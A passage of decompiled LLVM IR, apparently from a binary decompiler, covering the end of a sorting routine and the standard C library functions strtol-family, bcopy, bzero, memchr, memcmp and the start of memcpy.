  br label %dec_label_pc_f5e0

dec_label_pc_f5e0:                                ; preds = %dec_label_pc_f508, %dec_label_pc_f5c8
  %v1_f56c = phi i32 [ %v2_f514, %dec_label_pc_f508 ], [ %v2_f5dc, %dec_label_pc_f5c8 ]
  %v0_f608 = phi i32 [ %v0_f50c, %dec_label_pc_f508 ], [ %v1_f5d8, %dec_label_pc_f5c8 ]
  %v0_f604 = phi i32 [ %v0_f5ec.pre, %dec_label_pc_f508 ], [ %v2_f5d8, %dec_label_pc_f5c8 ]
  %v2_f618 = phi i32 [ 1, %dec_label_pc_f508 ], [ %v0_f5e4.pre, %dec_label_pc_f5c8 ]
  %v1_f5e4 = add i32 %v2_f618, -1
  store i32 %v1_f5e4, i32* @r5, align 4
  store i32 %v2_f5e8, i32* %r2.global-to-local, align 4
  %v2_f5f0 = and i32 %v1_f5e4, 1073741824
  %v3_f5f0 = icmp eq i32 %v2_f5f0, 0
  %v4_f5f0 = mul i32 %v1_f5e4, 4
  %v5_f5f0 = add i32 %v4_f5f0, %v2_f5e8
  store i32 %v5_f5f0, i32* @lr, align 4
  br i1 %v3_f5f0, label %dec_label_pc_f528, label %dec_label_pc_f5f8

dec_label_pc_f5f8:                                ; preds = %dec_label_pc_f5e0
  store i32 %v2_f4c0, i32* @r4, align 4
  store i32 %v2_f4e8, i32* @r5, align 4
  %v0_f60c = load i32, i32* @sb, align 4
  store i32 %v0_f60c, i32* %r2.global-to-local, align 4
  %v8_f61c = call i32 @trinkle(i32 %v0_f604, i32 %v0_f608, i32 %v0_f60c, i32* nonnull %stack_var_-48, i32 %v2_f618, i32 0, i32 %v2_f4e8)
  store i32 %v2_f4e8, i32* @fp, align 4
  store i32 %v2_f4c0, i32* @sl, align 4
  %v0_f628 = load i32, i32* @r6, align 4
  %v1_f628 = load i32, i32* @r8, align 4
  %v2_f628 = sub i32 %v1_f628, %v0_f628
  br label %dec_label_pc_f6e8

dec_label_pc_f630:                                ; preds = %dec_label_pc_f6e8
  %v8_f630 = icmp sgt i32 %v0_f6ec, 1
  br i1 %v8_f630, label %dec_label_pc_f654, label %dec_label_pc_f634

dec_label_pc_f634:                                ; preds = %dec_label_pc_f6fc, %dec_label_pc_f630
  %v2_f638 = call i32 @pntz(i32* nonnull %stack_var_-48)
  %v3_f648 = call i32 @shr(i32* nonnull %stack_var_-48, i32 %v2_f638)
  %v0_f64c = load i32, i32* @r7, align 4
  %v2_f64c = add i32 %v2_f638, %v0_f64c
  store i32 %v2_f64c, i32* @r7, align 4
  br label %dec_label_pc_f6dc

dec_label_pc_f654:                                ; preds = %dec_label_pc_f630
  %v3_f654 = call i32 @shl(i32* nonnull %stack_var_-48, i32 2)
  %v3_f658 = load i32, i32* %stack_var_-48, align 4
  %v1_f660 = xor i32 %v3_f658, 7
  %v0_f668 = load i32, i32* @r7, align 4
  %v1_f668 = add i32 %v0_f668, -2
  store i32 %v1_f668, i32* @r7, align 4
  store i32 %v1_f660, i32* %stack_var_-48, align 4
  %v3_f670 = call i32 @shr(i32* nonnull %stack_var_-48, i32 1)
  %v1_f678 = load i32, i32* @r7, align 4
  %v4_f678 = mul i32 %v1_f678, 4
  %v5_f678 = add i32 %v4_f678, %v2_f5e8
  %v1_f67c = add i32 %v5_f678, -200
  %v2_f67c = inttoptr i32 %v1_f67c to i32*
  %v3_f67c = load i32, i32* %v2_f67c, align 4
  %v1_f680 = load i32, i32* @r8, align 4
  %v2_f680 = sub i32 %v1_f680, %v3_f67c
  %v1_f684 = add i32 %v1_f678, 1
  %v0_f688 = load i32, i32* @sb, align 4
  store i32 %v0_f688, i32* %r2.global-to-local, align 4
  %v0_f690 = load i32, i32* @r6, align 4
  %v2_f690 = sub i32 %v2_f680, %v0_f690
  %v3_f69c = load i32, i32* @r4, align 4
  %v8_f6a0 = call i32 @trinkle(i32 %v2_f690, i32 %v0_f690, i32 %v0_f688, i32* nonnull %stack_var_-48, i32 %v1_f684, i32 %v3_f69c, i32 %v2_f4e8)
  %v0_f6a8 = load i32, i32* @r4, align 4
  %v3_f6ac = call i32 @shl(i32* nonnull %stack_var_-48, i32 %v0_f6a8)
  %v3_f6b0 = load i32, i32* %stack_var_-48, align 4
  %v0_f6b4 = load i32, i32* @r5, align 4
  %v1_f6b8 = or i32 %v3_f6b0, 1
  %v0_f6bc = load i32, i32* @r6, align 4
  %v0_f6c0 = load i32, i32* @sb, align 4
  store i32 %v0_f6c0, i32* %r2.global-to-local, align 4
  store i32 %v1_f6b8, i32* %stack_var_-48, align 4
  %v0_f6cc = load i32, i32* @r4, align 4
  %v0_f6d0 = load i32, i32* @r7, align 4
  %v8_f6d8 = call i32 @trinkle(i32 %v0_f6b4, i32 %v0_f6bc, i32 %v0_f6c0, i32* nonnull %stack_var_-48, i32 %v0_f6d0, i32 %v0_f6cc, i32 %v2_f4e8)
  br label %dec_label_pc_f6dc

dec_label_pc_f6dc:                                ; preds = %dec_label_pc_f634, %dec_label_pc_f654
  %v0_f6e0 = load i32, i32* @r8, align 4
  %v2_f6e0 = sub i32 %v0_f6e0, %v0_f50c
  store i32 %v2_f6e0, i32* @r8, align 4
  %v0_f6e4 = load i32, i32* @r5, align 4
  %v2_f6e4 = sub i32 %v0_f6e4, %v0_f50c
  br label %dec_label_pc_f6e8

dec_label_pc_f6e8:                                ; preds = %dec_label_pc_f5f8, %dec_label_pc_f6dc
  %storemerge = phi i32 [ %v2_f628, %dec_label_pc_f5f8 ], [ %v2_f6e4, %dec_label_pc_f6dc ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 1, i32* @r4, align 4
  %v0_f6ec = load i32, i32* @r7, align 4
  %v9_f6ec = icmp eq i32 %v0_f6ec, 1
  br i1 %v9_f6ec, label %dec_label_pc_f6fc, label %dec_label_pc_f630

dec_label_pc_f6fc:                                ; preds = %dec_label_pc_f6e8
  %v3_f6fc = load i32, i32* %stack_var_-48, align 4
  %v9_f700 = icmp eq i32 %v3_f6fc, 1
  br i1 %v9_f700, label %dec_label_pc_f714.loopexit, label %dec_label_pc_f634

dec_label_pc_f714.loopexit:                       ; preds = %dec_label_pc_f6fc
  br label %dec_label_pc_f714

dec_label_pc_f714:                                ; preds = %dec_label_pc_f714.loopexit, %entry
  %v1_f71c = phi i32 [ %v2_f4c0, %dec_label_pc_f714.loopexit ], [ 1, %entry ]
  store i32 %v12_f4a4, i32* @r7, align 4
  store i32 %v27_f4a4, i32* @lr, align 4
  ret i32 %v1_f71c

; uselistorder directives
  uselistorder i32 %v0_f6ec, { 1, 0 }
  uselistorder i32 %v0_f690, { 1, 0 }
  uselistorder i32 %v5_f5f0, { 1, 0 }
  uselistorder i32 %v1_f5e4, { 1, 0, 2 }
  uselistorder i32 %v2_f618, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_f604, { 0, 2, 3, 1 }
  uselistorder i32 %v0_f608, { 0, 2, 3, 1 }
  uselistorder i32 %v2_f5dc, { 1, 0 }
  uselistorder i32 %v1_f5d8, { 1, 0 }
  uselistorder i32 %v0_f53c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_f52c, { 1, 0 }
  uselistorder i32 %v0_f50c, { 0, 1, 3, 2 }
  uselistorder i32 %v1_f500, { 1, 0 }
  uselistorder i32 %v1_f4fc, { 0, 2, 1 }
  uselistorder i32 %v2_f4e8, { 5, 6, 7, 1, 8, 2, 3, 4, 9, 0, 10 }
  uselistorder i32 %v2_f4a0, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-48, { 12, 1, 13, 14, 9, 2, 3, 15, 16, 0, 10, 11, 4, 17, 18, 7, 6, 5, 8, 19, 20, 21 }
  uselistorder i32* %stack_var_-240, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 (i32*, i32)* @shr, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @sift, { 2, 0, 1 }
  uselistorder i32 %arg3, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f6e8, { 1, 0 }
  uselistorder label %dec_label_pc_f6dc, { 1, 0 }
  uselistorder label %dec_label_pc_f5e0, { 1, 0 }
  uselistorder label %dec_label_pc_f5c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f5a0, { 1, 0 }
}

define i32 @strtox() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %v6_f724 = load i32, i32* @r5, align 4
  %v9_f724 = load i32, i32* @r6, align 4
  %v12_f724 = load i32, i32* @r7, align 4
  %v0_f728 = load i32, i32* @r0, align 4
  store i32 %v0_f728, i32* @r5, align 4
  %v1_f728 = icmp slt i32 %v0_f728, 0
  %v4_f734 = add i32 %v0_f728, 2147483647
  %storemerge = select i1 %v1_f728, i32 -1, i32 %v4_f734
  %v2_f738 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_f738, i32* @r4, align 4
  %v0_f73c = load i32, i32* @r1, align 4
  store i32 %v0_f73c, i32* @r7, align 4
  %v0_f748 = load i32, i32* @r2, align 4
  store i32 %v0_f748, i32* @r6, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v7_f76c = call i32 @__shlim(i32 %v2_f738, i32 0, i32 0, i32 0, i32 0, i32 %v0_f728, i32 %storemerge)
  store i32 %tmp3, i32* @r4, align 4
  %v0_f77c = load i32, i32* @r6, align 4
  %v6_f788 = sext i32 %v0_f77c to i64
  %v7_f788 = call i32 @__intscan(i32 %v2_f738, i64 %v6_f788, i32 1, i32 %tmp12, i32 %tmp12, i32 %tmp3)
  %v0_f78c = load i32, i32* @r7, align 4
  %v2_f78c = icmp eq i32 %v0_f78c, 0
  br i1 %v2_f78c, label %dec_label_pc_f7b0, label %dec_label_pc_f794

dec_label_pc_f794:                                ; preds = %entry
  store i32 %tmp, i32* @r2, align 4
  %v0_f7a8 = load i32, i32* @r5, align 4
  %v2_f79c = add i32 %v0_f728, %tmp
  %v2_f7a4 = sub i32 %v2_f79c, %storemerge
  %v2_f7a8 = add i32 %v2_f7a4, %v0_f7a8
  store i32 %v2_f7a8, i32* @r3, align 4
  %v2_f7ac = inttoptr i32 %v0_f78c to i32*
  store i32 %v2_f7a8, i32* %v2_f7ac, align 4
  br label %dec_label_pc_f7b0

dec_label_pc_f7b0:                                ; preds = %entry, %dec_label_pc_f794
  store i32 %v6_f724, i32* @r5, align 4
  store i32 %v9_f724, i32* @r6, align 4
  store i32 %v12_f724, i32* @r7, align 4
  ret i32 %v7_f788

; uselistorder directives
  uselistorder i32 %v2_f738, { 1, 0, 2 }
  uselistorder i32 %v0_f728, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_f7b0, { 1, 0 }
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  %v0_f7d0 = call i32 @strtox()
  ret i32 %v0_f7d0
}

define i32 @strtoul(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_f7e0 = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  %v0_f7f4 = call i32 @strtox()
  store i32 %v3_f7e0, i32* @r4, align 4
  ret i32 %v0_f7f4
}

define i32 @strtoll() local_unnamed_addr {
entry:
  store i32 -2147483648, i32* @r4, align 4
  %v0_f818 = call i32 @strtox()
  ret i32 %v0_f818
}

define i64 @strtoimax(i8* %nptr, i8** %endptr, i32 %base) local_unnamed_addr {
entry:
  %v0_f828 = call i32 @strtoll()
  %v1_f828 = sext i32 %v0_f828 to i64
  ret i64 %v1_f828
}

define i32 @strtoull() local_unnamed_addr {
entry:
  store i32 -1, i32* @r4, align 4
  %v0_f840 = call i32 @strtox()
  ret i32 %v0_f840

; uselistorder directives
  uselistorder i32 ()* @strtox, { 1, 3, 0, 2 }
}

define i64 @strtoumax(i8* %nptr, i8** %endptr, i32 %base) local_unnamed_addr {
entry:
  %v0_f850 = call i32 @strtoull()
  %v1_f850 = sext i32 %v0_f850 to i64
  ret i64 %v1_f850
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_f868 = inttoptr i32 %arg2 to i8*
  %v3_f868 = call i32 @memmove(i8* %v2_f868, i32 %arg1)
  ret i32 %v3_f868
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  store i32 0, i32* @r1, align 4
  %v0_f888 = call i32 @memset()
  ret i32 %v0_f888
}

define i32 @memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @ip, align 4
  %v2_f89c = icmp eq i32 %arg3, 0
  br i1 %v2_f89c, label %bb38, label %bb

bb:                                               ; preds = %entry
  br label %bb38

bb38:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 1, %bb ], [ %arg3, %entry ]
  %v0_f8ac = phi i32 [ 1, %bb ], [ 0, %entry ]
  store i32 %storemerge, i32* @r2, align 4
  %v0_f8a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_f8a4 = urem i32 %v0_f8a4, 4
  %v2_f8a4 = icmp eq i32 %v1_f8a4, 0
  br i1 %v2_f8a4, label %bb40, label %bb39

bb39:                                             ; preds = %bb38
  br label %bb40

bb40:                                             ; preds = %bb38, %bb39
  %storemerge55 = phi i32 [ 1, %bb39 ], [ %v1_f8a4, %bb38 ]
  %v1_f8ac = phi i32 [ 1, %bb39 ], [ 0, %bb38 ]
  store i32 %storemerge55, i32* @r3, align 4
  %v2_f8ac = and i32 %v1_f8ac, %v0_f8ac
  %v4_f8ac = icmp eq i32 %v2_f8ac, 0
  %v1_f8b4 = urem i32 %arg2, 256
  br i1 %v4_f8ac, label %dec_label_pc_f8ec, label %dec_label_pc_f8e0

dec_label_pc_f8c0:                                ; preds = %dec_label_pc_f8e0
  %v1_f8c0 = add i32 %v0_f8c0, -1
  store i32 %v1_f8c0, i32* @ip, align 4
  %v7_f8c0 = icmp ne i32 %v0_f8c0, 1
  %v1_f8c4 = add i32 %v0_f8c4, 1
  store i32 %v1_f8c4, i32* %r0.global-to-local, align 4
  %. = zext i1 %v7_f8c0 to i32
  store i32 %., i32* @r2, align 4
  %v1_f8d0 = urem i32 %v1_f8c4, 4
  %v2_f8d0 = icmp eq i32 %v1_f8d0, 0
  br i1 %v2_f8d0, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_f8c0
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_f8c0, %bb43
  %storemerge56 = phi i32 [ 1, %bb43 ], [ %v1_f8d0, %dec_label_pc_f8c0 ]
  %v1_f8d8 = phi i32 [ 1, %bb43 ], [ 0, %dec_label_pc_f8c0 ]
  store i32 %storemerge56, i32* @r3, align 4
  %v2_f8d8 = and i32 %v1_f8d8, %.
  %v4_f8d8 = icmp eq i32 %v2_f8d8, 0
  br i1 %v4_f8d8, label %dec_label_pc_f8ec, label %dec_label_pc_f8e0

dec_label_pc_f8e0:                                ; preds = %bb40, %bb44
  %v0_f8ec16 = phi i32 [ %., %bb44 ], [ %v0_f8ac, %bb40 ]
  %v0_f8c0 = phi i32 [ %v1_f8c0, %bb44 ], [ %arg3, %bb40 ]
  %v0_f8c4 = phi i32 [ %v1_f8c4, %bb44 ], [ %v0_f8a4, %bb40 ]
  %v1_f8e0 = inttoptr i32 %v0_f8c4 to i8*
  %v2_f8e0 = load i8, i8* %v1_f8e0, align 1
  %v3_f8e0 = zext i8 %v2_f8e0 to i32
  store i32 %v3_f8e0, i32* @r3, align 4
  %v9_f8e4 = icmp eq i32 %v3_f8e0, %v1_f8b4
  br i1 %v9_f8e4, label %dec_label_pc_f8ec, label %dec_label_pc_f8c0

dec_label_pc_f8ec:                                ; preds = %dec_label_pc_f8e0, %bb44, %bb40
  %v0_f9c0 = phi i32 [ %arg3, %bb40 ], [ %v0_f8c0, %dec_label_pc_f8e0 ], [ %v1_f8c0, %bb44 ]
  %v0_f91c = phi i32 [ %v0_f8a4, %bb40 ], [ %v0_f8c4, %dec_label_pc_f8e0 ], [ %v1_f8c4, %bb44 ]
  %v0_f8ec = phi i32 [ %v0_f8ac, %bb40 ], [ %v0_f8ec16, %dec_label_pc_f8e0 ], [ %., %bb44 ]
  %v2_f8ec = icmp eq i32 %v0_f8ec, 0
  br i1 %v2_f8ec, label %dec_label_pc_f9c0, label %dec_label_pc_f8f4

dec_label_pc_f8f4:                                ; preds = %dec_label_pc_f8ec
  %v1_f8f4 = inttoptr i32 %v0_f91c to i8*
  %v2_f8f4 = load i8, i8* %v1_f8f4, align 1
  %v3_f8f4 = zext i8 %v2_f8f4 to i32
  store i32 %v3_f8f4, i32* @r3, align 4
  %v9_f8f8 = icmp eq i32 %v3_f8f4, %v1_f8b4
  br i1 %v9_f8f8, label %dec_label_pc_f900, label %dec_label_pc_f908

dec_label_pc_f900:                                ; preds = %dec_label_pc_f9a4, %dec_label_pc_f990, %dec_label_pc_f9c0, %dec_label_pc_f8f4, %dec_label_pc_f9d4, %dec_label_pc_f9b8
  %v1_f904 = phi i32 [ %v0_f998, %dec_label_pc_f990 ], [ %v0_f91c, %dec_label_pc_f9c0 ], [ %v0_f91c, %dec_label_pc_f8f4 ], [ 0, %dec_label_pc_f9d4 ], [ 0, %dec_label_pc_f9b8 ], [ %v1_f9a4, %dec_label_pc_f9a4 ]
  ret i32 %v1_f904

dec_label_pc_f908:                                ; preds = %dec_label_pc_f8f4
  %tmp57 = icmp ult i32 %v0_f9c0, 4
  br i1 %tmp57, label %dec_label_pc_f9cc, label %dec_label_pc_f914

dec_label_pc_f914:                                ; preds = %dec_label_pc_f908
  %v1_f91c = inttoptr i32 %v0_f91c to i32*
  %v2_f91c = load i32, i32* %v1_f91c, align 4
  %v3_f920 = mul nuw i32 %v1_f8b4, 16842752
  store i32 %v3_f920, i32* @r2, align 4
  %v2_f924 = mul nuw i32 %v1_f8b4, 16843009
  store i32 %v2_f924, i32* %r0.global-to-local, align 4
  %v2_f928 = xor i32 %v2_f91c, %v2_f924
  %v1_f938 = add i32 %v2_f928, -16843009
  %v1_f93c = sub i32 -1, %v2_f928
  store i32 %v1_f93c, i32* @r1, align 4
  %v2_f940 = and i32 %v1_f93c, -2139062144
  %v1_f9841 = and i32 %v2_f940, %v1_f938
  store i32 %v1_f9841, i32* @r3, align 4
  %v2_f9883 = icmp eq i32 %v1_f9841, 0
  br i1 %v2_f9883, label %dec_label_pc_f948, label %dec_label_pc_f990

dec_label_pc_f948:                                ; preds = %dec_label_pc_f914, %dec_label_pc_f958
  %v0_f950 = phi i32 [ %v1_f950, %dec_label_pc_f958 ], [ %v0_f91c, %dec_label_pc_f914 ]
  %v0_f948 = phi i32 [ %v1_f948, %dec_label_pc_f958 ], [ %v0_f9c0, %dec_label_pc_f914 ]
  %v1_f948 = add i32 %v0_f948, -4
  store i32 %v1_f948, i32* @ip, align 4
  %v1_f950 = add i32 %v0_f950, 4
  %tmp58 = icmp ult i32 %v1_f948, 4
  br i1 %tmp58, label %dec_label_pc_f9cc.loopexit, label %dec_label_pc_f958

dec_label_pc_f958:                                ; preds = %dec_label_pc_f948
  %v1_f958 = inttoptr i32 %v1_f950 to i32*
  %v2_f958 = load i32, i32* %v1_f958, align 4
  %v2_f95c = xor i32 %v2_f958, %v2_f924
  %v1_f96c = add i32 %v2_f95c, -16843009
  %v1_f970 = sub i32 -1, %v2_f95c
  store i32 %v1_f970, i32* @r2, align 4
  %v2_f974 = and i32 %v1_f970, -2139062144
  %v1_f984 = and i32 %v2_f974, %v1_f96c
  store i32 %v1_f984, i32* @r3, align 4
  %v2_f988 = icmp eq i32 %v1_f984, 0
  br i1 %v2_f988, label %dec_label_pc_f948, label %dec_label_pc_f978.dec_label_pc_f990.loopexit_crit_edge

dec_label_pc_f978.dec_label_pc_f990.loopexit_crit_edge: ; preds = %dec_label_pc_f958
  br label %dec_label_pc_f990

dec_label_pc_f990:                                ; preds = %dec_label_pc_f914, %dec_label_pc_f978.dec_label_pc_f990.loopexit_crit_edge, %dec_label_pc_f9cc
  %v0_f9b029 = phi i32 [ %v0_f9cc, %dec_label_pc_f9cc ], [ %v1_f948, %dec_label_pc_f978.dec_label_pc_f990.loopexit_crit_edge ], [ %v0_f9c0, %dec_label_pc_f914 ]
  %v0_f998 = phi i32 [ %v0_f99028, %dec_label_pc_f9cc ], [ %v1_f950, %dec_label_pc_f978.dec_label_pc_f990.loopexit_crit_edge ], [ %v0_f91c, %dec_label_pc_f914 ]
  %v1_f990 = inttoptr i32 %v0_f998 to i8*
  %v2_f990 = load i8, i8* %v1_f990, align 1
  %v3_f990 = zext i8 %v2_f990 to i32
  store i32 %v3_f990, i32* @r3, align 4
  %v9_f994 = icmp eq i32 %v3_f990, %v1_f8b4
  store i32 %v0_f998, i32* %r0.global-to-local, align 4
  br i1 %v9_f994, label %dec_label_pc_f900, label %dec_label_pc_f9b0

dec_label_pc_f9a4:                                ; preds = %dec_label_pc_f9b0
  %v1_f9a4 = add i32 %v0_f9a4, 1
  %v2_f9a4 = inttoptr i32 %v1_f9a4 to i8*
  %v3_f9a4 = load i8, i8* %v2_f9a4, align 1
  %v4_f9a4 = zext i8 %v3_f9a4 to i32
  store i32 %v4_f9a4, i32* @r3, align 4
  store i32 %v1_f9a4, i32* %r0.global-to-local, align 4
  %v9_f9a8 = icmp eq i32 %v4_f9a4, %v1_f8b4
  br i1 %v9_f9a8, label %dec_label_pc_f900, label %dec_label_pc_f9b0

dec_label_pc_f9b0:                                ; preds = %dec_label_pc_f990, %dec_label_pc_f9a4
  %v0_f9a4 = phi i32 [ %v1_f9a4, %dec_label_pc_f9a4 ], [ %v0_f998, %dec_label_pc_f990 ]
  %v0_f9b0 = phi i32 [ %v1_f9b0, %dec_label_pc_f9a4 ], [ %v0_f9b029, %dec_label_pc_f990 ]
  %v1_f9b0 = add i32 %v0_f9b0, -1
  store i32 %v1_f9b0, i32* @ip, align 4
  %v7_f9b0 = icmp eq i32 %v0_f9b0, 1
  br i1 %v7_f9b0, label %dec_label_pc_f9b8, label %dec_label_pc_f9a4

dec_label_pc_f9b8:                                ; preds = %dec_label_pc_f9b0, %dec_label_pc_f9c0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f900

dec_label_pc_f9c0:                                ; preds = %dec_label_pc_f8ec
  %v2_f9c0 = icmp eq i32 %v0_f9c0, 0
  br i1 %v2_f9c0, label %dec_label_pc_f9b8, label %dec_label_pc_f900

dec_label_pc_f9cc.loopexit:                       ; preds = %dec_label_pc_f948
  br label %dec_label_pc_f9cc

dec_label_pc_f9cc:                                ; preds = %dec_label_pc_f9cc.loopexit, %dec_label_pc_f908
  %v0_f99028 = phi i32 [ %v1_f950, %dec_label_pc_f9cc.loopexit ], [ %v0_f91c, %dec_label_pc_f908 ]
  %v0_f9cc = phi i32 [ %v1_f948, %dec_label_pc_f9cc.loopexit ], [ %v0_f9c0, %dec_label_pc_f908 ]
  %v2_f9cc = icmp eq i32 %v0_f9cc, 0
  br i1 %v2_f9cc, label %dec_label_pc_f9d4, label %dec_label_pc_f990

dec_label_pc_f9d4:                                ; preds = %dec_label_pc_f9cc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f900

; uselistorder directives
  uselistorder i32 %v0_f9cc, { 1, 0 }
  uselistorder i32 %v1_f9b0, { 1, 0 }
  uselistorder i32 %v1_f9a4, { 1, 2, 3, 0 }
  uselistorder i32 %v0_f998, { 0, 2, 3, 1 }
  uselistorder i32 %v1_f970, { 1, 0 }
  uselistorder i32 %v1_f950, { 0, 1, 3, 2 }
  uselistorder i32 %v1_f948, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_f93c, { 1, 0 }
  uselistorder i32 %v0_f91c, { 4, 1, 0, 5, 2, 3, 6 }
  uselistorder i32 %v0_f9c0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_f8c4, { 0, 2, 1 }
  uselistorder i32 %v0_f8c0, { 0, 2, 1 }
  uselistorder i32 %., { 3, 1, 2, 0 }
  uselistorder i32 %v1_f8c4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_f8b4, { 4, 2, 5, 1, 0, 3 }
  uselistorder i32 %v0_f8a4, { 2, 1, 0 }
  uselistorder i32 %v0_f8ac, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_f9b8, { 1, 0 }
  uselistorder label %dec_label_pc_f9b0, { 1, 0 }
  uselistorder label %dec_label_pc_f990, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f948, { 1, 0 }
  uselistorder label %dec_label_pc_f900, { 4, 2, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_f8e0, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
}

define i32 @memcmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_f9dc = icmp eq i32 %arg3, 0
  store i32 %tmp, i32* @ip, align 4
  br i1 %v2_f9dc, label %dec_label_pc_fa14, label %dec_label_pc_f9e8

dec_label_pc_f9e8:                                ; preds = %entry
  %v3_f9e8 = load i8, i8* %arg1, align 1
  %v1_f9ec = inttoptr i32 %arg2 to i8*
  %v2_f9ec = load i8, i8* %v1_f9ec, align 1
  %v9_f9f0 = icmp eq i8 %v3_f9e8, %v2_f9ec
  br i1 %v9_f9f0, label %dec_label_pc_fa0c, label %dec_label_pc_fa1c

dec_label_pc_f9fc:                                ; preds = %dec_label_pc_fa0c
  %v1_fa0c = add i32 %v0_fa0c, -1
  %v1_f9fc = add i32 %v0_f9fc, 1
  %v2_f9fc = inttoptr i32 %v1_f9fc to i8*
  %v3_f9fc = load i8, i8* %v2_f9fc, align 1
  store i32 %v1_f9fc, i32* @ip, align 4
  %v1_fa00 = add i32 %v0_fa00, 1
  %v2_fa00 = inttoptr i32 %v1_fa00 to i8*
  %v3_fa00 = load i8, i8* %v2_fa00, align 1
  %v9_fa04 = icmp eq i8 %v3_f9fc, %v3_fa00
  br i1 %v9_fa04, label %dec_label_pc_fa0c, label %dec_label_pc_fa1c

dec_label_pc_fa0c:                                ; preds = %dec_label_pc_f9e8, %dec_label_pc_f9fc
  %v0_fa00 = phi i32 [ %v1_fa00, %dec_label_pc_f9fc ], [ %arg2, %dec_label_pc_f9e8 ]
  %v0_f9fc = phi i32 [ %v1_f9fc, %dec_label_pc_f9fc ], [ %tmp, %dec_label_pc_f9e8 ]
  %v0_fa0c = phi i32 [ %v1_fa0c, %dec_label_pc_f9fc ], [ %arg3, %dec_label_pc_f9e8 ]
  %v7_fa0c = icmp eq i32 %v0_fa0c, 1
  br i1 %v7_fa0c, label %dec_label_pc_fa14, label %dec_label_pc_f9fc

dec_label_pc_fa14:                                ; preds = %dec_label_pc_fa0c, %entry
  ret i32 0

dec_label_pc_fa1c:                                ; preds = %dec_label_pc_f9fc, %dec_label_pc_f9e8
  %v1_fa1c.in = phi i8 [ %v3_f9e8, %dec_label_pc_f9e8 ], [ %v3_f9fc, %dec_label_pc_f9fc ]
  %v0_fa1c.in = phi i8 [ %v2_f9ec, %dec_label_pc_f9e8 ], [ %v3_fa00, %dec_label_pc_f9fc ]
  %v0_fa1c = zext i8 %v0_fa1c.in to i32
  %v1_fa1c = zext i8 %v1_fa1c.in to i32
  %v2_fa1c = sub nsw i32 %v1_fa1c, %v0_fa1c
  ret i32 %v2_fa1c

; uselistorder directives
  uselistorder label %dec_label_pc_fa0c, { 1, 0 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_n.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_fa24 = load i32, i32* %r0.global-to-local, align 4
  %v8_fa24 = load i32, i32* @r4, align 4
  %v11_fa24 = load i32, i32* @lr, align 4
  %v0_fa2c = load i32, i32* %r2.global-to-local, align 4
  %v1_fa2c = add i32 %v0_fa2c, -4
  %v2_fa2c = icmp ugt i32 %v0_fa2c, 3
  store i1 %v2_fa2c, i1* %cpsr_c.global-to-local, align 1
  %v6_fa2c = icmp slt i32 %v1_fa2c, 0
  store i1 %v6_fa2c, i1* %cpsr_n.global-to-local, align 1
  %v3_fa30 = icmp ult i32 %v0_fa2c, 2
  br i1 %v3_fa30, label %dec_label_pc_fd00, label %dec_label_pc_fa34

